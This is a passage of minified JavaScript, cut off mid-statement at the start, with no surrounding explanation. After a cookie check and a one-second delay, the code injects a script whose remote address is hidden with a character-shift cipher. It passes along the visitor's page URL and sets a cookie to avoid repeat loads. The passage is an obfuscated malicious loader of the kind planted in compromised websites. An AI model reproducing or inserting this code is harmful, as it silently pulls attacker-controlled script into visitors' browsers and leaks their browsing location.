RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxy'+'fy3sjy4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));